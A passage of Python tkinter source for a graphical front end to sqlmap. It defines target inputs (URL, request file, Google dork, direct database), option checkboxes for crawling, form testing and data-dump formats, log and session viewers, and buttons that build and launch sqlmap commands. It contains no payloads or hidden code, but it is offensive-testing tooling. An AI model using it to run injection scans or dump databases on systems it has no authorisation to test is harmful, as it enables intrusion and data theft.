#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""gui for SQLmap"""

import os
import re
import shlex
import subprocess
import tkinter
import tkinter.filedialog
import tkinter.font
import tkinter.ttk
import urllib.parse
from tkinter import ttk, font
from typing import Optional


# Linux requires GNOME Terminal, as in the original project.

# -----------------------------------------
# SQLmap Update
# -----------------------------------------


def update_i_t():
    if os.name == "posix":
        subprocess.Popen([
            "gnome-terminal", "--", "/bin/bash", "-c",
            "python3 sqlmap.py --update; exec bash",
        ])
    else:
        os.system('start cmd /k python sqlmap.py --update')


# ------------------------------------------
# CopyPasteCut
# ------------------------------------------
def r_clicker(e):
    try:
        def r_click__copy():
            e.widget.event_generate('<Control-c>')

        def r_click__cut():
            e.widget.event_generate('<Control-x>')

        def r_click_paste():
            e.widget.event_generate('<Control-v>')

        e.widget.focus()
        nclst = [
            (' Cut', r_click__cut),
            (' Copy', r_click__copy),
            (' Paste', r_click_paste),
        ]
        rmenu = tkinter.Menu(None, tearoff=0, takefocus=0)

        for (txt, cmd) in nclst:
            rmenu.add_command(label=txt, command=cmd)

        rmenu.tk_popup(e.x_root + 40, e.y_root + 10, entry="0")
    except tkinter.TclError:
        pass
    return "break"


def r_clicking(self):
    try:
        for b in ['Text', 'Entry', 'Listbox', 'Label']:
            self.bind_class(b, sequence='<Button-3>', func=r_clicker, add='')
    except tkinter.TclError:
        pass


class VerticalScrolledFrame(ttk.Frame):
    """A frame whose contents can be scrolled vertically."""

    def __init__(self, parent):
        super().__init__(parent)

        # Keep the normal window compact enough for the current display. The
        # content remains accessible through the scrollbar on shorter screens.
        viewport_height = max(320, min(520, self.winfo_screenheight() - 260))
        frame_background = ttk.Style().lookup("TFrame", "background")

        self.canvas = tkinter.Canvas(
            self,
            width=1,
            height=viewport_height,
            borderwidth=0,
            highlightthickness=0,
            background=frame_background,
        )
        self.scrollbar = ttk.Scrollbar(
            self,
            orient="vertical",
            command=self.canvas.yview,
        )
        self.content = ttk.Frame(self.canvas)
        self._content_window = self.canvas.create_window(
            (0, 0),
            window=self.content,
            anchor="nw",
        )

        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        self.canvas.grid(row=0, column=0, sticky="nsew")
        self.scrollbar.grid(row=0, column=1, sticky="ns")
        self.rowconfigure(0, weight=1)
        self.columnconfigure(0, weight=1)

        self.content.bind("<Configure>", self._update_scroll_region)
        self.canvas.bind("<Configure>", self._resize_content)

        # Install one application-wide mouse-wheel router. It scrolls only the
        # scrollable tab currently under the pointer.
        top = self.winfo_toplevel()
        if not getattr(top, "_scrollable_tabs_bound", False):
            top.bind_all("<MouseWheel>", self._route_mousewheel, add="+")
            top.bind_all("<Button-4>", self._route_mousewheel, add="+")
            top.bind_all("<Button-5>", self._route_mousewheel, add="+")
            top._scrollable_tabs_bound = True

    def _update_scroll_region(self, _event=None):
        self.canvas.configure(scrollregion=self.canvas.bbox("all"))

    def _resize_content(self, event):
        # When the application is enlarged, fill the whole canvas with the
        # themed content frame instead of exposing the Canvas background.
        # If the content is taller than the viewport, retain its requested
        # height so vertical scrolling continues to work.
        content_height = max(event.height, self.content.winfo_reqheight())
        self.canvas.itemconfigure(
            self._content_window,
            width=event.width,
            height=content_height,
        )
        self.canvas.configure(scrollregion=self.canvas.bbox("all"))

    def _route_mousewheel(self, event) -> Optional[str]:
        widget: Optional[tkinter.Misc] = self.winfo_containing(
            self.winfo_pointerx(),
            self.winfo_pointery(),
        )

        # Let controls with their own vertical scrolling handle the wheel.
        if isinstance(widget, (tkinter.Listbox, tkinter.Text)):
            return None

        while isinstance(widget, tkinter.Misc):
            if isinstance(widget, VerticalScrolledFrame):
                delta = getattr(event, "delta", 0)
                if getattr(event, "num", None) == 4 or delta > 0:
                    direction = -1
                elif getattr(event, "num", None) == 5 or delta < 0:
                    direction = 1
                else:
                    return None

                widget.canvas.yview_scroll(direction * 3, "units")
                return "break"

            parent = getattr(widget, "master", None)
            widget = parent if isinstance(parent, tkinter.Misc) else None

        return None


class MainApplication(tkinter.Frame):
    nRoot: ttk.Notebook
    noBF: ttk.Notebook
    Lcat: tkinter.Listbox
    sesTXT: tkinter.Text
    reqFile: tkinter.Text
    d_log_txt: tkinter.Text
    d_log_TXT: tkinter.Text
    e_file_read: ttk.Entry
    urlentry: ttk.Combobox
    def __init__(self, mw):
        tkinter.Frame.__init__(self, mw)
        self.d_log_TXT = tkinter.Text()
        self.grid(sticky='nswe')
        # Hot Keys: ######################################
        mw.bind('<F1>', self.help__f1)
        mw.bind('<Alt-Key-s>', self.alt_key_s)
        mw.bind('<Alt-Key-l>', self.alt_key_l)
        mw.bind('<Alt-Key-e>', self.alt_key_e)
        mw.bind('<F2>', self.commands)
        mw.bind('<Shift-Key-F2>', self.inject_it)
        mw.bind('<Button-3>', r_clicker, add='')
        mw.bind('<Alt-Key-1>', self.alt_key_1)
        mw.bind('<Alt-Key-2>', self.alt_key_2)
        mw.bind('<Alt-Key-3>', self.alt_key_3)
        mw.bind('<Alt-Key-4>', self.alt_key_4)
        mw.bind('<Alt-Key-5>', self.alt_key_5)
        # ################################################
        self.rowconfigure(0, weight=1)
        self.columnconfigure(0, weight=1)
        self.nRoot = ttk.Notebook(self)
        builder_frame = ttk.Frame(self.nRoot)
        watch_log = ttk.Frame(self.nRoot)
        editor = ttk.Frame(self.nRoot)
        help_me = ttk.Frame(self.nRoot)
        tampers_list = ttk.Frame(self.nRoot)

        self.nRoot.add(builder_frame, text='Builder')
        self.nRoot.add(watch_log, text='Log viewer')
        self.nRoot.add(editor, text='Editor')
        self.nRoot.add(help_me, text='Help!')
        self.nRoot.rowconfigure(0, weight=1)
        self.nRoot.columnconfigure(0, weight=1)
        self.nRoot.grid(row=0, column=0, sticky='nswe', ipady=3, ipadx=3)
        self.nRoot.add(tampers_list, text='Tampers List')
        self.nRoot.rowconfigure(0, weight=1)
        self.nRoot.columnconfigure(0, weight=1)
        self.nRoot.grid(row=0, column=0, sticky='nswe', ipady=3, ipadx=3)
        self.nRoot.columnconfigure(0, weight=1)
        self.nRoot.grid(row=0, column=0, sticky='nswe', ipady=3, ipadx=3)
        self.nRoot.columnconfigure(0, weight=1)
        self.nRoot.grid(row=0, column=0, sticky='nswe', ipady=3, ipadx=3)
        # Keep the target/query panes at their requested height and give any
        # remaining (or missing) vertical space to the options notebook.
        builder_frame.rowconfigure(0, weight=0)
        builder_frame.rowconfigure(1, weight=0)
        builder_frame.rowconfigure(2, weight=1)
        builder_frame.rowconfigure(3, weight=0)
        builder_frame.columnconfigure(0, weight=1)
        editor.rowconfigure(0, weight=1)
        editor.columnconfigure(0, weight=1)
        help_me.rowconfigure(0, weight=1)
        help_me.columnconfigure(0, weight=1)
        tampers_list.rowconfigure(0, weight=1)
        tampers_list.columnconfigure(0, weight=1)
        # Help SqlMAP
        lfhelp = ttk.Labelframe(help_me)
        lfhelp.grid(sticky='nswe')
        scrol_help = ttk.Scrollbar(lfhelp)
        scrol_help.grid(row=0, column=1, sticky='ns')
        lfhelp.rowconfigure(0, weight=1)
        lfhelp.columnconfigure(0, weight=1)

        manual_sqlmap = 'python3 sqlmap.py -hh || cmd /k python sqlmap.py -hh || pythonw sqlmap.py -hh'
        process = subprocess.Popen(manual_sqlmap, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8')  # decoding bytes to string
        help_t_x_t = tkinter.Text(lfhelp, yscrollcommand=scrol_help.set, width=73,
                                  height=24, bg='#002B36', fg='#93A1A1')
        help_t_x_t.insert('1.0', output_str)  # use the decoded string here
        scrol_help.config(command=help_t_x_t.yview)
        help_t_x_t.grid(row=0, column=0, padx=3, sticky='nswe')
        # Tampers List
        tmprs_lst = ttk.Labelframe(tampers_list)
        tmprs_lst.grid(sticky='nswe')
        scrol_tampers = ttk.Scrollbar(tmprs_lst)
        scrol_tampers.grid(row=0, column=1, sticky='ns')
        tmprs_lst.rowconfigure(0, weight=1)
        tmprs_lst.columnconfigure(0, weight=1)

        manual_tampers_command = 'python3 sqlmap.py --list-tampers || cmd /k python sqlmap.py --list-tampers ' \
                                 '|| pythonw sqlmap.py --list-tampers'
        process = subprocess.Popen(manual_tampers_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8')  # decoding bytes to string
        tampers_txt = tkinter.Text(tmprs_lst, yscrollcommand=scrol_tampers.set, width=73,
                                   height=24, bg='#002B36', fg='#93A1A1')
        tampers_txt.insert('1.0', output_str)  # use the decoded string here
        scrol_tampers.config(command=tampers_txt.yview)
        tampers_txt.grid(row=0, column=0, padx=3, sticky='nswe')
        # EDITOR
        request_l_f = ttk.Labelframe(editor, text='')
        request_l_f.grid(row=0, column=0, sticky='nswe')
        request_l_f.columnconfigure(0, weight=1)
        request_l_f.rowconfigure(0, weight=1)
        # Open
        # Button Panel
        rout_panel = ttk.Labelframe(editor, text='')
        rout_panel.grid(row=1, sticky='we', columnspan=2)
        r_open = ttk.Button(rout_panel, width=15)
        r_open.config(text="openReqFile", command=self.open_req_f)
        r_open.grid(row=1, column=0, sticky='w')
        c_open = ttk.Button(rout_panel, width=15)
        c_open.config(text="openConfFile", command=self.open_ini_f)
        c_open.grid(row=1, column=1, sticky='w')
        r_save = ttk.Button(rout_panel, width=15)
        r_save.config(text="saveReqFile", command=self.save_req_f)
        r_save.grid(row=1, column=2, sticky='w')
        c_save = ttk.Button(rout_panel, width=15)
        c_save.config(text="saveConfFile", command=self.save_ini_f)
        c_save.grid(row=1, column=3, sticky='w')
        self.file_request_save = save_request = {}
        save_request['defaultextension'] = '.txt'
        save_request['filetypes'] = [('all files', '.*')]
        save_request['initialdir'] = './SQM/REQUEST/'
        save_request['parent'] = editor
        save_request['title'] = 'HTTP Requet FILE'
        self.file_ini = open_ini = {}
        open_ini['defaultextension'] = '.conf'
        open_ini['filetypes'] = [('all files', '.conf')]
        open_ini['initialdir'] = './SQM/CONFIGFILE/'
        open_ini['parent'] = editor
        open_ini['title'] = 'CONFIGFILE'
        #
        req_file_scr = ttk.Scrollbar(request_l_f)
        req_file_scr.grid(row=0, column=1, sticky='ns')
        self.reqFile = tkinter.Text(request_l_f, yscrollcommand=req_file_scr.set, undo=True, height=29, bg='#002B36',
                                    fg='#93A1A1')
        req_file_scr.config(command=self.reqFile.yview)
        self.reqFile.grid(row=0, column=0, sticky='nswe')
        self.reqFile.columnconfigure(0, weight=1)
        self.reqFile.rowconfigure(0, weight=1)
        # Load Log...
        lf_watch_log = ttk.Labelframe(watch_log, text='')
        watch_log.rowconfigure(0, weight=1)
        watch_log.columnconfigure(0, weight=1)
        lf_watch_log.grid(row=0, column=0, sticky='nswe', columnspan=10)
        lf_watch_log.rowconfigure(0, weight=1)
        lf_watch_log.columnconfigure(0, weight=1)
        #
        scrol_ses = ttk.Scrollbar(lf_watch_log)
        scrol_ses.grid(row=0, column=1, sticky='ns')
        #
        self.sesTXT = tkinter.Text(lf_watch_log, yscrollcommand=scrol_ses.set, width=73,
                                   height=22, bg='#002B36', fg='#93A1A1')
        scrol_ses.config(command=self.sesTXT.yview)
        self.sesTXT.grid(row=0, column=0, padx=3, sticky='nswe')
        self.sesTXT.bind('<F3>', self.on_find)
        self.sesTXT.bind('<F4>', self.on_find_all)
        # Button Panel
        but_panel = ttk.Labelframe(watch_log, text='')
        but_panel.grid(row=1, sticky='we', columnspan=2)
        logbut = ttk.Button(but_panel, width=3)
        logbut.config(text="log", command=self.logs)
        logbut.grid(row=1, column=0, sticky='ew', padx=4, pady=4)
        # full log
        self.chkLog = ttk.Checkbutton(but_panel)
        self.chkLog_var = tkinter.StringVar()
        self.chkLog.config(text="full log", variable=self.chkLog_var, onvalue="on",
                           offvalue="off")  # , command= self.chekLog)
        self.chkLog.grid(row=0, column=3, sticky='e', padx=8)
        #
        sesbut = ttk.Button(but_panel, width=10)
        sesbut.config(text="session", command=self.session)
        sesbut.grid(row=1, column=1, sticky='ew', padx=4, pady=4)
        #
        self.search_var = tkinter.StringVar()
        self.searchEdit = ttk.Entry(but_panel, width=30, textvariable=self.search_var)
        self.searchEdit.grid(row=0, column=0, columnspan=3, sticky='ew', padx=4, pady=4)
        but_panel.columnconfigure(0, weight=1)
        self.search_var.set('HotKey: F3-find, F4-find all')
        self.searchEdit.bind('<F3>', lambda e: self.on_find())
        self.searchEdit.bind('<F4>', lambda e: self.on_find_all())
        self.sesTXT.bind('<Alt_L><r>', self.logs)
        #
        ses_fbut = ttk.Button(but_panel, width=15)
        ses_fbut.config(text="open session", command=self.f_open_session_file)
        ses_fbut.grid(row=1, column=2, sticky='ew', padx=4, pady=4)
        self.file_session = options_session = {}
        options_session['defaultextension'] = ''
        options_session['initialdir'] = './SESSION/'
        options_session['parent'] = watch_log
        options_session['title'] = 'Open Session FILE'
        #
        trafbut = ttk.Button(but_panel, width=15)
        trafbut.config(text="open traffic", command=self.f_traffic_file)
        trafbut.grid(row=1, column=3, sticky='ew', padx=4, pady=4)
        self.file_traf = options_traf = {}
        options_traf['defaultextension'] = ''
        options_traf['initialdir'] = './TRAFFIC/'
        options_traf['parent'] = watch_log
        options_traf['title'] = 'Open Traffic FILE'
        #
        # A fixed grid keeps target controls aligned without draggable sashes.
        target_panel = ttk.Frame(builder_frame, padding=(8, 6))
        target_panel.grid(row=0, column=0, sticky='ew', rowspan=2)
        target_panel.columnconfigure(1, weight=1)

        ttk.Label(target_panel, text='Target', style='Section.TLabel').grid(
            row=0, column=0, columnspan=3, sticky='w', pady=(0, 4))
        self.target_sources = {
            'URL': 'url', 'OpenAPI / Swagger': 'openapi',
            'HTTP request file': 'requestFile', 'Bulk targets file': 'bulkFile',
            'Proxy log file': 'logFile', 'Google dork': 'googleDork',
            'Direct database': 'direct', 'Configuration file': 'configFile',
        }
        self.varTarget = tkinter.StringVar(value='url')
        self.target_source = ttk.Combobox(
            target_panel, values=list(self.target_sources), state='readonly', width=16)
        self.target_source.set('URL')
        self.target_source.grid(row=1, column=0, sticky='ew', padx=(0, 10))
        self.target_source.bind('<<ComboboxSelected>>', self.f_target_source)
        self.urlentry = ttk.Combobox(target_panel)
        self.urlentry.grid(row=1, column=1, sticky='ew')
        self.b_openapi_file = ttk.Button(
            target_panel, text='Browse…', command=self.f_target_file, state='disabled')
        self.b_openapi_file.grid(row=1, column=2, padx=(10, 0))
        self.b_openapi_file.grid_remove()
        self.target_hint = ttk.Label(
            target_panel, text='Enter the target URL, including https://',
            style='Hint.TLabel')
        self.target_hint.grid(row=2, column=1, columnspan=2, sticky='w', pady=(4, 0))

        self.openapi_frame = ttk.Frame(target_panel, padding=(0, 4, 0, 0))
        self.openapi_frame.grid(row=3, column=0, columnspan=3, sticky='ew')
        self.openapi_frame.columnconfigure(1, weight=1)
        self.var_openapi_base = tkinter.StringVar()
        self.var_openapi_tags = tkinter.StringVar()
        ttk.Label(self.openapi_frame, text='Base URL').grid(
            row=0, column=0, sticky='w', padx=(0, 12), pady=3)
        self.e_openapi_base = ttk.Entry(
            self.openapi_frame, textvariable=self.var_openapi_base)
        self.e_openapi_base.grid(row=0, column=1, sticky='ew', pady=3)
        ttk.Label(self.openapi_frame, text='Tags').grid(
            row=1, column=0, sticky='w', padx=(0, 12), pady=3)
        self.e_openapi_tags = ttk.Entry(
            self.openapi_frame, textvariable=self.var_openapi_tags)
        self.e_openapi_tags.grid(row=1, column=1, sticky='ew', pady=3)
        ttk.Label(self.openapi_frame,
                  text='Optional: base URL for specs without a host; tags separated by commas.',
                  style='Hint.TLabel').grid(row=2, column=1, sticky='w', pady=(2, 0))
        self.openapi_frame.grid_remove()

        ttk.Separator(target_panel).grid(
            row=4, column=0, columnspan=3, sticky='ew', pady=(6, 5))
        ttk.Label(target_panel, text='Generated command', style='Section.TLabel').grid(
            row=5, column=0, columnspan=3, sticky='w', pady=(0, 3))
        self.sql_var = tkinter.StringVar()
        self.sqlEdit = ttk.Entry(target_panel, textvariable=self.sql_var)
        self.sqlEdit.grid(row=6, column=0, columnspan=3, sticky='ew')
        self.noBF = ttk.Notebook(builder_frame)
        settings_page = VerticalScrolledFrame(self.noBF)
        s_det_tech_page = VerticalScrolledFrame(self.noBF)
        request_page = VerticalScrolledFrame(self.noBF)
        enumeration_page = VerticalScrolledFrame(self.noBF)
        file_page = VerticalScrolledFrame(self.noBF)
        api_page = VerticalScrolledFrame(self.noBF)

        settings_f = settings_page.content
        s_det_tech_f = s_det_tech_page.content
        request_f = request_page.content
        enumeration_f = enumeration_page.content
        enumeration_f.columnconfigure(0, weight=1)
        file_f = file_page.content
        api_f = api_page.content

        self.noBF.add(settings_page, text='Settings')
        self.noBF.add(s_det_tech_page, text='Injection & detection')
        self.noBF.add(request_page, text='Request')
        self.noBF.add(enumeration_page, text='Enumeration')
        self.noBF.add(file_page, text='Access')
        self.noBF.add(api_page, text='API')
        developer_page = VerticalScrolledFrame(self.noBF)
        self.noBF.add(developer_page, text='Developer')
        developer_f = developer_page.content
        developer_f.columnconfigure(0, weight=1)
        developer_options = ttk.Labelframe(developer_f, text='Developer diagnostics', padding=8)
        developer_options.grid(row=0, column=0, sticky='ew', padx=4, pady=4)

        self.noBF.columnconfigure(0, weight=1)
        self.noBF.grid(row=2, column=0, sticky='nswe', padx=3, pady=3)
        self.noBF.select(self.noBF.tabs()[1])

        settings_f.columnconfigure(0, weight=1)
        s_det_tech_f.columnconfigure(0, weight=1)
        request_f.columnconfigure(0, weight=1)
        file_f.columnconfigure(0, weight=1)
        api_f.columnconfigure(0, weight=1)
        # Keep related actions together; give the launch action visual priority.
        action_bar = ttk.Frame(builder_frame, padding=(8, 6))
        action_bar.grid(row=3, column=0, sticky='ew')
        action_bar.columnconfigure(0, weight=1)
        ttk.Label(action_bar, text='F2: Build   ·   Shift+F2: Run',
                  style='Hint.TLabel').grid(row=0, column=0, sticky='w')
        update_button = ttk.Button(action_bar, text='Update', command=update_i_t)
        update_button.grid(row=0, column=1, padx=(8, 0))
        but = ttk.Button(action_bar, text='Build command',
                         command=self.commands)
        but.grid(row=0, column=2, padx=(8, 8))
        but_inj = ttk.Button(action_bar, text='Run SQLmap', width=14,
                             style='Primary.TButton', command=self.inject_it)
        but_inj.grid(row=0, column=3)
        for container, text_widget in ((lfhelp, help_t_x_t),
                                       (tmprs_lst, tampers_txt),
                                       (request_l_f, self.reqFile),
                                       (lf_watch_log, self.sesTXT)):
            text_widget.configure(wrap='none')
            horizontal = ttk.Scrollbar(container, orient='horizontal', command=text_widget.xview)
            text_widget.configure(xscrollcommand=horizontal.set)
            horizontal.grid(row=1, column=0, sticky='ew')
        # Settings use two equal cards per row, with aligned option/value fields.
        settings_f.columnconfigure(0, weight=1, uniform='settings_cards')
        settings_f.columnconfigure(1, weight=1, uniform='settings_cards')
        run_settings = ttk.Labelframe(settings_f, text='Run behavior', padding=8)
        run_settings.grid(row=0, column=0, columnspan=1, sticky='nsew', padx=4, pady=4)
        run_settings.columnconfigure(1, weight=1)
        discovery_settings = ttk.Labelframe(settings_f, text='Target discovery', padding=8)
        discovery_settings.grid(row=0, column=1, columnspan=1, sticky='nsew', padx=4, pady=4)
        discovery_settings.columnconfigure(1, weight=1)
        performance_settings = ttk.Labelframe(settings_f, text='Performance & fingerprint', padding=8)
        performance_settings.grid(row=1, column=0, columnspan=1, sticky='nsew', padx=4, pady=4)
        performance_settings.columnconfigure(1, weight=1)
        display_settings = ttk.Labelframe(settings_f, text='Console & progress', padding=8)
        display_settings.grid(row=1, column=1, columnspan=1, sticky='nsew', padx=4, pady=4)
        display_settings.columnconfigure(1, weight=1)
        data_settings = ttk.Labelframe(settings_f, text='Data & export format', padding=8)
        data_settings.grid(row=2, column=0, columnspan=1, sticky='nsew', padx=4, pady=4)
        data_settings.columnconfigure(1, weight=1)
        advanced_settings = ttk.Labelframe(settings_f, text='Tests, scripts & maintenance', padding=8)
        advanced_settings.grid(row=2, column=1, columnspan=1, sticky='nsew', padx=4, pady=4)
        advanced_settings.columnconfigure(1, weight=1)
        file_settings = ttk.Labelframe(settings_f, text='Session & output files', padding=8)
        file_settings.grid(row=3, column=0, columnspan=2, sticky='nsew', padx=4, pady=4)
        file_settings.columnconfigure(1, weight=1)
        # GENERAL
        # --forms             Parse and test forms on target url
        self.chk_forms = ttk.Checkbutton(discovery_settings)
        self.chk_forms_var = tkinter.StringVar()
        self.chk_forms.config(text="forms", variable=self.chk_forms_var, onvalue="on",
                              offvalue="off", command=self.f_forms)
        self.chk_forms.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --fresh-queries     Ignores query results stored in session file
        self.chk_fresh = ttk.Checkbutton(file_settings)
        self.chk_fresh_var = tkinter.StringVar()
        self.chk_fresh.config(text="fresh-queries", variable=self.chk_fresh_var, onvalue="on",
                              offvalue="off", command=self.f_fresh)
        self.chk_fresh.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --parse-errors      Parse and display DBMS error messages from responses
        self.chk_parse_errors = ttk.Checkbutton(display_settings)
        self.chk_parse_errors_var = tkinter.StringVar()
        self.chk_parse_errors.config(text="parse-errors", variable=self.chk_parse_errors_var, onvalue="on",
                                     offvalue="off", command=self.f_parse_errors)
        self.chk_parse_errors.grid(row=3, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --repair            Redump entries having unknown character marker (?)
        self.chk_repair = ttk.Checkbutton(data_settings)
        self.chk_repair_var = tkinter.StringVar()
        self.chk_repair.config(text="repair", variable=self.chk_repair_var, onvalue="on",
                               offvalue="off", command=self.f_repair)
        self.chk_repair.grid(row=10, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --flush-session     Flush session file for current target
        self.chk_flush = ttk.Checkbutton(file_settings)
        self.chk_flush_var = tkinter.StringVar()
        self.chk_flush.config(text="flush-session", variable=self.chk_flush_var, onvalue="on",
                              offvalue="off", command=self.f_flush)
        self.chk_flush.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --hex               Use DBMS hex function(s) for data retrieval
        self.chk_hex = ttk.Checkbutton(data_settings)
        self.chk_hex_var = tkinter.StringVar()
        self.chk_hex.config(text="hex", variable=self.chk_hex_var, onvalue="on",
                            offvalue="off", command=self.f_hex)
        self.chk_hex.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --eta               Display for each output the estimated time of arrival
        self.chk_eta = ttk.Checkbutton(display_settings)
        self.chk_eta_var = tkinter.StringVar()
        self.chk_eta.config(text="eta", variable=self.chk_eta_var, onvalue="on",
                            offvalue="off", command=self.f_eta)
        self.chk_eta.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --batch             Never ask for user input, use the default behaviour
        self.chk_batch = ttk.Checkbutton(run_settings)
        self.chk_batch_var = tkinter.StringVar()
        self.chk_batch.config(text="batch", variable=self.chk_batch_var, onvalue="on",
                              offvalue="off", command=self.f_batch)
        self.chk_batch.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --no-logging          Disable logging to a file
        self.chk_no_logging = ttk.Checkbutton(display_settings)
        self.chk_no_logging_var = tkinter.StringVar()
        self.chk_no_logging.config(text="no-logging", variable=self.chk_no_logging_var, onvalue="on",
                                   offvalue="off", command=self.f_no_logging)
        self.chk_no_logging.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --crawl=CRAWLDEPTH  Crawl the website starting from the target url
        self.chk_crawl = ttk.Checkbutton(discovery_settings)
        self.chkCrawl_var = tkinter.StringVar()
        self.chk_crawl.config(text="crawl", variable=self.chkCrawl_var, onvalue="on",
                              offvalue="off", command=self.f_crawl)
        self.chk_crawl.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_crawl = ttk.Combobox(discovery_settings)
        self.e_crawl_value = tkinter.StringVar()
        self.e_crawl.config(textvariable=self.e_crawl_value, state='disabled', width=12)
        self.e_crawl['values'] = ('1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '50', '100')
        self.e_crawl.current(0)
        self.e_crawl.bind('<<ComboboxSelected>>', self.f_crawl)
        self.e_crawl.grid(row=1, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
        self.chk_crawl_exclude = ttk.Checkbutton(discovery_settings)
        self.chk_crawl_exclude_var = tkinter.StringVar()
        self.chk_crawl_exclude.config(text="crawl-exclude", variable=self.chk_crawl_exclude_var, onvalue="on",
                                      offvalue="off", command=self.f_crawl_exclude)
        self.chk_crawl_exclude.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_crawl_exclude = ttk.Combobox(discovery_settings)
        self.e_crawl_exclude_value = tkinter.StringVar()
        self.e_crawl_exclude.config(textvariable=self.e_crawl_exclude_value, state='disabled', width=12)
        self.e_crawl_exclude['values'] = 'logout'
        self.e_crawl_exclude.current(0)
        self.e_crawl_exclude.bind('<<ComboboxSelected>>', self.f_crawl_exclude)
        self.e_crawl_exclude.grid(row=2, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --charset=CHARSET   Force character encoding used for data retrieval
        self.chk_charset = ttk.Checkbutton(data_settings)
        self.chk_charset_var = tkinter.StringVar()
        self.chk_charset.config(text="charset", variable=self.chk_charset_var, onvalue="on",
                                offvalue="off", command=self.f_charset)
        self.chk_charset.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_charset = ttk.Combobox(data_settings)
        self.e_charset_value = tkinter.StringVar()
        self.e_charset.config(textvariable=self.e_charset_value, state='disabled', width=12)
        self.e_charset['values'] = ('ISO-8859-1', 'ISO-8859-15', 'Big5', 'GBK', 'GB18030', 'UTF-32', 'UTF-8', 'UTF-16',
                                    'UTF-7', 'KOI8-U', 'KOI8-R', 'windows-1251', 'unicodeFFFE')
        self.e_charset.current(0)
        self.e_charset.bind('<<ComboboxSelected>>', self.f_charset)
        self.e_charset.grid(row=2, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --check-internet    Check Internet connection before assesing the target
        self.chk_internet_connect = ttk.Checkbutton(run_settings)
        self.chk_internet_connect_var = tkinter.StringVar()
        self.chk_internet_connect.config(text="check-internet", variable=self.chk_internet_connect_var, onvalue="on",
                                         offvalue="off", command=self.f_check_connect)
        self.chk_internet_connect.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --binary-fields=..  Result fields having binary values (e.g. "digest")
        self.chk_binary_fields = ttk.Checkbutton(data_settings)
        self.chk_binary_fields_var = tkinter.StringVar()
        self.chk_binary_fields.config(text="binary-fields", variable=self.chk_binary_fields_var, onvalue="on",
                                      offvalue="off", command=self.f_binary_fields)
        self.chk_binary_fields.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_binary_fields = ttk.Combobox(data_settings)
        self.e_binary_fields_value = tkinter.StringVar()
        self.e_binary_fields.config(textvariable=self.e_binary_fields_value, state='disabled', width=12)
        self.e_binary_fields['values'] = 'digest'
        self.e_binary_fields.current(0)
        self.e_binary_fields.bind('<<ComboboxSelected>>', self.f_binary_fields)
        self.e_binary_fields.grid(row=3, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --dump-format=DUMPFORMAT  Format of dumped data (CSV (default), HTML or SQLITE)
        self.chk_dump_format = ttk.Checkbutton(data_settings)
        self.chk_dump_format_var = tkinter.StringVar()
        self.chk_dump_format.config(text="dump-format", variable=self.chk_dump_format_var, onvalue="on",
                                    offvalue="off", command=self.f_dump_format)
        self.chk_dump_format.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_dump_format = ttk.Combobox(data_settings)
        self.e_dump_format_value = tkinter.StringVar()
        self.e_dump_format.config(textvariable=self.e_dump_format_value, state='disabled', width=12)
        self.e_dump_format['values'] = ('CSV', 'HTML', 'SQLITE', 'JSONL')
        self.e_dump_format.current(0)
        self.e_dump_format.bind('<<ComboboxSelected>>', self.f_dump_format)
        self.e_dump_format.grid(row=0, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --encoding=GBK     Character encoding used for data retrieval (e.g. GBK)
        self.chk_encoding = ttk.Checkbutton(data_settings)
        self.chk_encoding_var = tkinter.StringVar()
        self.chk_encoding.config(text="encoding", variable=self.chk_encoding_var, onvalue="on",
                                 offvalue="off", command=self.f_encoding)

        self.chk_encoding.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.encoding = ttk.Combobox(data_settings)
        self.encoding_value = tkinter.StringVar()
        self.encoding.config(textvariable=self.encoding_value, state='disabled', width=12)
        self.encoding['values'] = ('GBK', 'ISO-8859-1', 'ISO-8859-15', 'Big5', 'GB18030', 'UTF-32', 'UTF-8', 'UTF-16',
                                   'UTF-7', 'KOI8-U', 'KOI8-R', 'windows-1251', 'unicodeFFFE')
        self.encoding.current(0)
        self.encoding.bind('<<ComboboxSelected>>', self.f_encoding)
        self.encoding.grid(row=1, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
        self.chk_csv_del = ttk.Checkbutton(data_settings)
        self.chk_csv_del_var = tkinter.StringVar()
        self.chk_csv_del.config(text="csv-del", variable=self.chk_csv_del_var, onvalue="on",
                                offvalue="off", command=self.f_csv_del)
        self.chk_csv_del.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_csv_del = ttk.Combobox(data_settings)
        self.e_csv_del_value = tkinter.StringVar()
